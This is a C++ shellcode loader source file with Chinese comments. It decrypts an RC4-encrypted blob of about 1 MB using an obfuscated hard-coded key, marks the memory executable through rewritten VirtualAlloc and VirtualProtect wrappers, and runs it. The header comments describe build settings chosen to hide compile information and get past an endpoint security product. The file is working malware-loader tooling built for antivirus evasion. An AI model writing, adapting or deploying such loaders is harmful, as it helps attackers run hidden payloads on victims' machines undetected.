// ShellcodeLoader.cpp : 定义控制台应用程序的入口点。
//
/*

更新时间：2021年1月2日21:15:45

编译环境：vs2010 Win32 release

字符编码：多字节字符集

项目设置：
关闭缓冲区安全检查，这是为了嵌入汇编时程序不崩
基本运行时检查选默认值
数据执行保护关闭（可选），如果关闭就不需要修改内存执行权限，这个无明显影响，因为我已经重写了VirtualProtect
清单工具-输入输出-嵌入清单，这个需要关闭，这样可以隐藏编译信息，过 SecureAge APEX



*/

#include "stdafx.h"


//-------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------

int StartShellcode();
void InitKey();

//-------------------------------------------------------------------------------------------------------------------------
//-------------------------------------------------------------------------------------------------------------------------



char key[64] = {0};



int main()
{
	StartShellcode();

	return 0;
}

// 初始化密钥
void InitKey()
{
	key[0] = ~'H' + 3;
	key[1] = ~'a' + 3;
	key[2] = ~'m' + 3;
	key[3] = ~'b' + 3;
	key[4] = ~'a' + 3;
	key[5] = ~'g' + 3;
	key[6] = ~'a' + 3;

	for (size_t i = 0; i < 7; i++)
	{
		key[i] -= 3;
		key[i] = ~key[i];			
	}
}

// 解密，运行shellcode
int StartShellcode()
{
	InitKey();

	// 初始化NTDLL函数
	InitWow64Transition();

	//shellcode 缓冲区的大小从 ShellcodeData.cpp 中查看
	DWORD dwShellcodeSize = 1067626;

	LPVOID pShellcode = MyVirtualAlloc(NULL, dwShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// 写入shellcode
	InitShellcode(pShellcode);

	// 解密
	Rc4Decrypt(pShellcode, dwShellcodeSize, key, strlen(key));

	// 修改内存属性为可执行
	DWORD OldProtect;
	MyVirtualProtect(pShellcode, dwShellcodeSize, PAGE_EXECUTE_READWRITE, &OldProtect);

	// 执行
	((LPTHREAD_START_ROUTINE)pShellcode)(0);

	return 0;
}



